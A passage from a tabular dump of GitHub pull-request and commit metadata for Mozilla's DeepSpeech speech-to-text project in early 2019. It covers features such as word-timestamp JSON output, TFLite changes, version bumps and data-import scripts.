		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae3e2f7b6c1bc87b3e96b10e6c9804d089c56d14,"* Client changes for compatibility with new API
* Output is now CSV"
2470,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,be72608eb8c04c7c70e0493dec95a07d5c3de405,No longer exposing DS_SetupStreamAndFeedAudioContent
2471,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1796a930d57c00305e407ec0cbe63d29e31657db,Whitespace / cleanup
2472,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1891,1891,Update .compute script for new cluster setup,,reuben,477142,2019-02-19T16:27:12Z,MEMBER,True,16,16,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,718ef951ad2583daf921625a4799bc5136c6d7a7,Update .compute script for new cluster setup
2473,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1890,1890,Fixed typo in relu_clip description.,,danielwinkler,114568,2019-02-19T10:33:47Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3bc2f8bdd51b36baad773e18867f1b7e6ecfcd43,Fixed typo in relu_clip description.
2474,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1889,1889,Record character timing offset at peak probability of character,Uplifted from https://github.com/parlance/ctcdecode/commit/173dddbe3234420b174f6f2cf6b9855e26dc9bd3,reuben,477142,2019-02-18T01:41:47Z,MEMBER,True,11,3,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5bf6e63f1b87289ab870d0f027b2be185d5ae79e,"Record character timing offset at peak probability of character

Uplifted from https://github.com/parlance/ctcdecode/commit/173dddbe3234420b174f6f2cf6b9855e26dc9bd3"
2475,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1884,1884,Fix tc decision,,lissyx,1645737,2019-02-17T00:23:52Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a43838c4fb76a1f6082072a4675d9f4d6dddc39,Hotfix TC decision
2476,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1883,1883,Force comments on output to allow piping,Fixes #1882,lissyx,1645737,2019-02-17T00:09:01Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7ef82af74faac58a8121e7e6d3ff0a562d34cf75,"Force comments on output to allow piping

Fixes #1882"
2477,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1880,1880,Add --define=runtime=tflite config_setting,Fixes #1879,lissyx,1645737,2019-02-14T18:21:36Z,COLLABORATOR,True,15,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7a82c9608e1c31fd5a725aaf6ff299f8dfeee88,"Add --define=runtime=tflite config_setting

Fixes #1879"
2478,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1878,1878,Enable TFLite post-training quantization,Fixes #1850,lissyx,1645737,2019-02-14T17:30:52Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e6cca187d64bcf21eea98660a125b01689b1c2bf,"Enable TFLite post-training quantization

Fixes #1850"
2479,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1877,1877,make sure abspath is saved to file,even if user provides relative path at command line,JRMeyer,8389864,2019-02-14T00:50:58Z,CONTRIBUTOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,99e11f62aeed25078ef6420cbf3766a3e60fb06d,"make sure abspath is saved to file, even if user provides relative path at command line"
2480,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1875,1875,Limit amount of processes,,lissyx,1645737,2019-02-13T16:36:35Z,COLLABORATOR,True,7,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9ad9b39a1680491579525a188b9273ec6c47518,Limit amount of processes
2481,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1874,1874, --alphabet-format flag,"`--alphabet-format` flag will print found alphabet to terminal and can be copy-pasted into `alphabet.txt`

Also now script makes use of `argparse`.",JRMeyer,8389864,2019-02-12T22:59:27Z,CONTRIBUTOR,True,22,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de932752c54f0aa2229e079f08d071bcea846d04,--alphabet-format flag will print found alphabet to terminal and can by copy-pasted into alphabet.txt. Also now script makes use of argparse.
2482,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1874,1874, --alphabet-format flag,"`--alphabet-format` flag will print found alphabet to terminal and can be copy-pasted into `alphabet.txt`

Also now script makes use of `argparse`.",JRMeyer,8389864,2019-02-12T22:59:27Z,CONTRIBUTOR,True,22,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a56d968b73ba0c39c3ed17a70a941cfd1474deb1,quotes
2483,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1873,1873,Prettier error message to the terminal when alphabets are mis-matched.,"This PR merely removes `\n` from the error message in `text.py`. Also, the message is shortened.",JRMeyer,8389864,2019-02-12T22:12:20Z,CONTRIBUTOR,True,1,8,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32bf1a685a7d5b255a2627a280debf4ebfef461d,prettier error message to the terminal when alphabets are mis-matched.
2484,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1872,1872,Fix shape of loaded preprocessed features (Fixes #1738 and #1772),,reuben,477142,2019-02-12T18:28:50Z,MEMBER,True,7,5,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c1212ffbb295834442082eb0fae457b079241bfd,Fix shape of loaded preprocessed features
2485,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1872,1872,Fix shape of loaded preprocessed features (Fixes #1738 and #1772),,reuben,477142,2019-02-12T18:28:50Z,MEMBER,True,7,5,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d903150c8d376600be4e4c9a934dcf49e8060a5,"Pin NumPy to a version that doesn't break HDF5 loading

https://github.com/pandas-dev/pandas/issues/24839"
2486,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1870,1870,-q quiet mode flag to suppress version numbers,This adds a -q command-line option to suppress version numbers and just output the transcription.,dabinat,18251622,2019-02-10T21:56:26Z,COLLABORATOR,False,12,4,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2ea113223459ee7332eb4f6678d758b2ca2fc265,-q quiet mode flag to suppress version numbers
2487,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1865,1865,Fixed #1864,Removed one last link,kdavis-mozilla,12054740,2019-02-05T16:25:54Z,CONTRIBUTOR,True,0,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e2e0902f9e9fb328314df3bd46a1ad05170ca9f6,Fixed #1864
2488,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1863,1863,Removed link to ReadTheDocs docs as they were not well maintained.,Fixed #1861 by removing the link and the associated  GitHub Service.,kdavis-mozilla,12054740,2019-02-05T10:52:16Z,CONTRIBUTOR,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0ed7741e1226ceebde4ffabf3382eef00b3bd952,Removed link to ReadTheDocs docs as they were not well maintained.
2489,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1862,1862,Clean up and split TensorFlow deps out of util/text.py,"This PR removes some unused code and splits code that depends on TensorFlow out of `util/text.py` and into `util/ctc.py` so that `from util import text` does not require TensorFlow to be installed. This should help with the work Alex is doing on evaluating the accuracy of a TFLite model.

It also does some small refactoring of the test report generation functions.",reuben,477142,2019-02-04T10:41:25Z,MEMBER,True,47,124,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a14bcc4deebd5f4612587381a01cb97686d9155,Clean up and split TensorFlow deps of text.py
2490,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1862,1862,Clean up and split TensorFlow deps out of util/text.py,"This PR removes some unused code and splits code that depends on TensorFlow out of `util/text.py` and into `util/ctc.py` so that `from util import text` does not require TensorFlow to be installed. This should help with the work Alex is doing on evaluating the accuracy of a TFLite model.

It also does some small refactoring of the test report generation functions.",reuben,477142,2019-02-04T10:41:25Z,MEMBER,True,47,124,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3613da82ae7c7439d2674460a0f671e9848fb22,Use tf.contrib.layers.dense_to_sparse instead of util/ctc.py
2491,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1862,1862,Clean up and split TensorFlow deps out of util/text.py,"This PR removes some unused code and splits code that depends on TensorFlow out of `util/text.py` and into `util/ctc.py` so that `from util import text` does not require TensorFlow to be installed. This should help with the work Alex is doing on evaluating the accuracy of a TFLite model.

It also does some small refactoring of the test report generation functions.",reuben,477142,2019-02-04T10:41:25Z,MEMBER,True,47,124,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12c62756c77a850cc0726f0d6cd45dff2ba84bdc,Switch wer_cer_batch to compute real CER over corpus
2492,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1860,1860,Import cv,script for importing data from common voice and reformatting the TSV file created by `CorporaCreator` such that new *.csv files can be directly used in `DeepSpeech.py`,JRMeyer,8389864,2019-02-01T12:37:59Z,CONTRIBUTOR,True,124,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e6e33eb3a734cdc260c2c2b22295288bfd526f9e,import script for new CV
2493,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1860,1860,Import cv,script for importing data from common voice and reformatting the TSV file created by `CorporaCreator` such that new *.csv files can be directly used in `DeepSpeech.py`,JRMeyer,8389864,2019-02-01T12:37:59Z,CONTRIBUTOR,True,124,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e26aefc39bcfd61be39a1413c5cdfb1f427febfc,better handling of empty TSV dir / comments
2494,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1860,1860,Import cv,script for importing data from common voice and reformatting the TSV file created by `CorporaCreator` such that new *.csv files can be directly used in `DeepSpeech.py`,JRMeyer,8389864,2019-02-01T12:37:59Z,CONTRIBUTOR,True,124,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9810946035af2b83c8af9413dd07754da3e9a33e,usage
2495,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1860,1860,Import cv,script for importing data from common voice and reformatting the TSV file created by `CorporaCreator` such that new *.csv files can be directly used in `DeepSpeech.py`,JRMeyer,8389864,2019-02-01T12:37:59Z,CONTRIBUTOR,True,124,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7bee1cf4456674b66c6d2e5008b7c27f15ca2294,train/test/dev checking now made explicit
2496,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1857,1857,Fix invalid characters in speech to text result,Default string in .NET uses UTF-16 causing invalid characters to appear as mentioned in [here](https://discourse.mozilla.org/t/multilingual-dataset-combiner-cleaner/34788/13?u=roseman). This pull fixes the issue by returning the result as UTF-8.,roxima,31028960,2019-01-30T19:05:05Z,CONTRIBUTOR,True,12,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7900ae52729835b54f4c563d0a92d34387945c80,Process speech result as UTF-8
2497,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1857,1857,Fix invalid characters in speech to text result,Default string in .NET uses UTF-16 causing invalid characters to appear as mentioned in [here](https://discourse.mozilla.org/t/multilingual-dataset-combiner-cleaner/34788/13?u=roseman). This pull fixes the issue by returning the result as UTF-8.,roxima,31028960,2019-01-30T19:05:05Z,CONTRIBUTOR,True,12,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0ef26b450f33d9cfab7c5da1ceb37cca07e3d2d4,Removed leftover comment
2498,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1854,1854,Add TFLite accuracy estimation tool,Fixes #1852,lissyx,1645737,2019-01-25T15:01:46Z,COLLABORATOR,True,160,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c0cd36554439c43e3ec6582607203eaf0e67f7f7,"Add TFLite accuracy estimation tool

Fixes #1852"
2499,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1853,1853,Update README.md,clarified the sentence stating the need for much hard drive space,kristiank,1181113,2019-01-25T12:52:54Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f1629788fe7607d1b10f2993534121b2efac6329,"Update README.md

clarified the sentence stating the need for much hard drive space"
2500,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1851,1851,Bump VERSION to 0.5.0-alpha.1,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-01-24T16:20:25Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7be00e8fe32e94b44a8a3e81dee86cc2755d0896,"Bump VERSION to 0.5.0-alpha.1

X-DeepSpeech: NOBUILD"
2501,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1848,1848,Produce Maven Bundle,Fixes #1841,lissyx,1645737,2019-01-23T10:10:52Z,COLLABORATOR,True,100,8,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b7d558eb6b61aa38c1e9d00a9bbfbcb866651fb,"Produce Maven Bundle

Fixes #1841"
2502,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1847,1847,Extract TensorFlow version ourselves,,lissyx,1645737,2019-01-23T09:25:59Z,COLLABORATOR,True,61,24,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d842c284b037b45a1c40ec9b32998256ebc7a46,Extract TensorFlow version ourselves
2503,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1846,1846,Bump VERSION to 0.5.0-alpha.0,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-01-23T09:01:12Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5608d94f001152c244e4f5c6dd6dd8589e5b0bb,"Bump VERSION to 0.5.0-alpha.0

X-DeepSpeech: NOBUILD"
2504,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1845,1845,Proper DeepSpeech error codes,Fixes #1782,lissyx,1645737,2019-01-22T18:06:50Z,COLLABORATOR,True,41,34,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6323a1428f9111e3fc08a570a292f98922e074a8,"Proper DeepSpeech error codes

Fixes #1782"
2505,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1844,1844,Tflite error checks,,lissyx,1645737,2019-01-22T15:21:32Z,COLLABORATOR,True,19,22,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b845533c9db65f543dd094218f924c546c4d74a,"Proper TFLite error checking

Fixes #1842"
2506,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1844,1844,Tflite error checks,,lissyx,1645737,2019-01-22T15:21:32Z,COLLABORATOR,True,19,22,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0493b9aae5f44301d501dd011264cfef14cac253,"Fix incorrect previous_state_h identification

Fixes #1843"
2507,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1836,1836,Pull tensors from TFLite model by name,Fixes #1835,lissyx,1645737,2019-01-16T22:15:06Z,COLLABORATOR,True,53,10,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8226dbc6caa2269b6628348995f57d66a6d2213a,"Pull tensors from TFLite model by name

Fixes #1835"
2508,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1834,1834,Update decoder parameter names in native client (Fixes #1828),,reuben,477142,2019-01-15T11:34:20Z,MEMBER,True,18,18,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,366a82d7e7bdcff79b58330172740cb6e704d08b,Update decoder parameter names in native client
2509,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1832,1832,Move to libdeepspeech,,lissyx,1645737,2019-01-14T10:21:35Z,COLLABORATOR,True,707,79,43,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b396d3a7d41ea335213583d28ab8a7435a52d590,"Move to libdeepspeech

Fixes #1784
Fixes #1786"
2510,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1829,1829,Bump VERSION to 0.4.1,,lissyx,1645737,2019-01-10T12:41:19Z,COLLABORATOR,True,7,7,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3dc365138458fb9646629182751f88ecfdfe7082,Bump VERSION to 0.4.1
2511,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1827,1827,Install realpath to allow DeepSpeech version extraction,Fixes #1826,lissyx,1645737,2019-01-09T14:43:33Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e8c4afb03854eb3b81a00dc29e146ca7ecba421,"Fix realpath to allow DeepSpeech version extraction

Fixes #1826"
2512,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1825,1825,Add basic Android native_client testing,Fixes #1785,lissyx,1645737,2019-01-09T10:55:40Z,COLLABORATOR,True,217,1,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08c9c9ab79783c4db5cd7daccee872f40425adcd,"Add basic Android native_client testing

Fixes #1785"
2513,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1820,1820,Don't save/load trie for character based LMs (Fixes #1756),Something like this. Should be backwards compatible.,reuben,477142,2019-01-07T10:50:52Z,MEMBER,True,10,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e8c208be2e237ba7643024ddb129b25d6a6c313,Don't save/load trie for character based LMs
2514,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1816,1816,Bump version to 0.4.0,To be merged and tagged when we do the release.,reuben,477142,2019-01-03T14:22:13Z,MEMBER,True,9,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff2db35aea76617bf88e3207e5b5812163855c8b,Bump version to 0.4.0
